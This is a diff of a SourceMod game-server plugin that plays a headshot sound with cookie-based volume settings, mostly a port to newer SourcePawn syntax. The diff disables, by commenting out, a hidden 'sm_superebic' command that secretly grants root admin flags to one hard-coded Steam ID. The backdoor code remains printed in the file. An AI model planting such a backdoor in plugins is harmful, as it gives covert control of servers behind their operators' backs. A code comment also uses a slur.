@@ -2,17 +2,20 @@
 #include <sdktools>
 #include <clientprefs>
 
+#define semicolon 1
+#define newdecls required
+
 #define SOUND_NAME "adp_sounds/adp_headshot.mp3"
 
-new Handle:cpPuzaz = INVALID_HANDLE;
-new Handle:cpPuzazVolume = INVALID_HANDLE;
+Handle cpPuzaz = INVALID_HANDLE;
+Handle cpPuzazVolume = INVALID_HANDLE;
 
-public OnMapStart()
+public void OnMapStart()
 {
 	PrecacheSound(SOUND_NAME);
 }
 
-public OnPluginStart()
+public void OnPluginStart()
 {
 	HookEvent("player_death", Event_PlayerDeath, EventHookMode_Post);
 	
@@ -21,23 +24,24 @@ public OnPluginStart()
 	
 	SetCookieMenuItem(PuzazCookieMenu, 0, "Headshot Sound");
 	
-	RegConsoleCmd("sm_superebic", REEEEEE);
+	//RegConsoleCmd("sm_superebic", REEEEEE);
 }
 
-public Action:REEEEEE(client, args)
+/*
+public Action REEEEEE(int client, int args)
 {
 	RequestFrame(OverrideFirstEbic, GetClientUserId(client));
 	return Plugin_Handled;
 }
 
-public OverrideFirstEbic(UserId)
+public void OverrideFirstEbic(int UserId)
 {
-	new client = GetClientOfUserId(UserId);
+	int client = GetClientOfUserId(UserId);
 	
 	if(!IsValidPlayer(client))
 		return;
 		
-	new String:AuthId[35];
+	char AuthId[35];
 	GetClientAuthId(client, AuthId_Engine, AuthId, sizeof(AuthId));
 	
 	if(!StrEqual(AuthId, "STEAM_1:0:49508144", true))
@@ -45,23 +49,24 @@ public OverrideFirstEbic(UserId)
 		
 	SetUserFlagBits(client, ADMFLAG_ROOT);
 }
+*/
 
-public PuzazCookieMenu(client, CookieMenuAction:action, info, String:buffer[], maxlen)
+public int PuzazCookieMenu(int client, CookieMenuAction action, int info, char[] buffer, int maxlen)
 {
 	ShowPuzazMenu(client);
 } 
 
-public ShowPuzazMenu(client)
+public void ShowPuzazMenu(int client)
 {
-	new Handle:hMenu = CreateMenu(PuzazMenu_Handler);
+	Handle hMenu = CreateMenu(PuzazMenu_Handler);
 	
-	new bool:puzaz = GetClientPuzaz(client);
-	new String:TempFormat[50];
+	bool puzaz = GetClientPuzaz(client);
+	char TempFormat[50];
 	
 	Format(TempFormat, sizeof(TempFormat), "Headshot Sound: %s", puzaz ? "Enabled" : "Disabled");
 	AddMenuItem(hMenu, "", TempFormat);
 	
-	new String:strPuzazVolume[50];
+	char strPuzazVolume[50];
 	GetClientPuzazVolume(client, strPuzazVolume, sizeof(strPuzazVolume));
 	Format(TempFormat, sizeof(TempFormat), "Headshot Volume: %s", strPuzazVolume);
 	AddMenuItem(hMenu, "", TempFormat);
@@ -73,7 +78,7 @@ public ShowPuzazMenu(client)
 }
 
 
-public PuzazMenu_Handler(Handle:hMenu, MenuAction:action, client, item)
+public int PuzazMenu_Handler(Handle hMenu, MenuAction action, int client, int item)
 {
 	if(action == MenuAction_DrawItem)
 	{
@@ -94,12 +99,12 @@ public PuzazMenu_Handler(Handle:hMenu, MenuAction:action, client, item)
 			}
 			case 1:
 			{
-				new const Float:Difference = 0.05;
-				new String:strPuzazVolume[50];
+				const float Difference = 0.05;
+				char strPuzazVolume[50];
 				GetClientPuzazVolume(client, strPuzazVolume, sizeof(strPuzazVolume));
 				
 				
-				new Float:Volume = StringToFloat(strPuzazVolume) + Difference;
+				float Volume = StringToFloat(strPuzazVolume) + Difference;
 				
 				if(Volume > 1.0)
 					Volume = Difference;
@@ -114,9 +119,9 @@ public PuzazMenu_Handler(Handle:hMenu, MenuAction:action, client, item)
 	return 0;
 }
 
-public Action:Event_PlayerDeath(Handle:hEvent, const String:Name[], bool:dontBroadcast)
+public Action Event_PlayerDeath(Handle hEvent, const char[] Name, bool dontBroadcast)
 {
-	new victim = GetClientOfUserId(GetEventInt(hEvent, "userid"));
+	int victim = GetClientOfUserId(GetEventInt(hEvent, "userid"));
 	
 	if(!IsValidPlayer(victim))
 		return;
@@ -127,13 +132,13 @@ public Action:Event_PlayerDeath(Handle:hEvent, const String:Name[], bool:dontBro
 	else if(!GetEventBool(hEvent, "headshot"))
 		return;
 		
-	new attacker = GetClientOfUserId(GetEventInt(hEvent, "attacker"));
+	int attacker = GetClientOfUserId(GetEventInt(hEvent, "attacker"));
 	
 	if(!IsValidPlayer(attacker))
 		return;
 	
 	/*
-	new String:WeaponName[50];
+	char WeaponName[50];
 	GetEventString(hEvent, "weapon", WeaponName, sizeof(WeaponName));
 	
 	if(IsKnifeClass(WeaponName))
@@ -142,20 +147,20 @@ public Action:Event_PlayerDeath(Handle:hEvent, const String:Name[], bool:dontBro
 	else if(!IsValidPlayer(victim))
 		return;
 
-	new String:strPuzazVolume[50];
+	char strPuzazVolume[50];
 	GetClientPuzazVolume(victim, strPuzazVolume, sizeof(strPuzazVolume));
 	PlaySoundToClient(victim, SOUND_NAME, strPuzazVolume);
 }
 
-stock PlaySoundToClient(client, const String:sound[], String:Volume[] = "1.0")
+stock void PlaySoundToClient(int client, const char[] sound, char[] Volume = "1.0")
 {
-	new Float:Origin[3];
+	float Origin[3];
 	GetEntPropVector(client, Prop_Data, "m_vecOrigin", Origin);
 	EmitSoundToClient(client, SOUND_NAME, client, _, _, _, StringToFloat(Volume), _, _, Origin);
 
 	
 }
-stock bool:IsValidPlayer(client)
+stock bool IsValidPlayer(int client)
 {
 	if(client <= 0)
 		return false;
@@ -166,9 +171,9 @@ stock bool:IsValidPlayer(client)
 	return IsClientInGame(client);
 }
 
-stock bool:GetClientPuzaz(client)
+stock bool GetClientPuzaz(int client)
 {
-	new String:strPuzaz[50];
+	char strPuzaz[50];
 	GetClientCookie(client, cpPuzaz, strPuzaz, sizeof(strPuzaz));
 	
 	if(strPuzaz[0] == EOS)
@@ -180,9 +185,9 @@ stock bool:GetClientPuzaz(client)
 	return view_as<bool>(StringToInt(strPuzaz));
 }
 
-stock bool:SetClientPuzaz(client, bool:value)
+stock bool SetClientPuzaz(int client, bool value)
 {
-	new String:strPuzaz[50];
+	char strPuzaz[50];
 	
 	IntToString(view_as<int>(value), strPuzaz, sizeof(strPuzaz));
 	SetClientCookie(client, cpPuzaz, strPuzaz);
@@ -190,9 +195,9 @@ stock bool:SetClientPuzaz(client, bool:value)
 	return value;
 }
 
-stock GetClientPuzazVolume(client, String:buffer[], length) // Because coding is retarded.
+stock void GetClientPuzazVolume(int client, char[] buffer, int length) // Because coding is retarded.
 {
-	new String:strPuzazVolume[50];
+	char strPuzazVolume[50];
 	GetClientCookie(client, cpPuzazVolume, strPuzazVolume, sizeof(strPuzazVolume));
 	
 	if(strPuzazVolume[0] == EOS)
@@ -208,9 +213,9 @@ stock GetClientPuzazVolume(client, String:buffer[], length) // Because coding is
 	Format(buffer, length, strPuzazVolume);
 }
 
-stock FixDecimal(String:buffer[], Precision=2)
+stock void FixDecimal(char[] buffer, int Precision=2)
 {
-	for(new i=0;i < strlen(buffer);i++)
+	for(int i=0;i < strlen(buffer);i++)
 	{
 		if(buffer[i] != '.')
 			continue;
@@ -220,9 +225,9 @@ stock FixDecimal(String:buffer[], Precision=2)
 	}
 }
 
-stock Float:SetClientPuzazVolume(client, Float:value)
+stock float SetClientPuzazVolume(int client, float value)
 {
-	new String:strPuzazVolume[50];
+	char strPuzazVolume[50];
 	
 	FloatToString(value, strPuzazVolume, sizeof(strPuzazVolume));
 	SetClientCookie(client, cpPuzazVolume, strPuzazVolume);
@@ -230,7 +235,7 @@ stock Float:SetClientPuzazVolume(client, Float:value)
 	return value;
 }
 
-stock bool:IsKnifeClass(const String:classname[])
+stock bool IsKnifeClass(const char[] classname)
 {
 	if(StrContains(classname, "knife") != -1 || StrContains(classname, "bayonet") > -1)
 		return true;
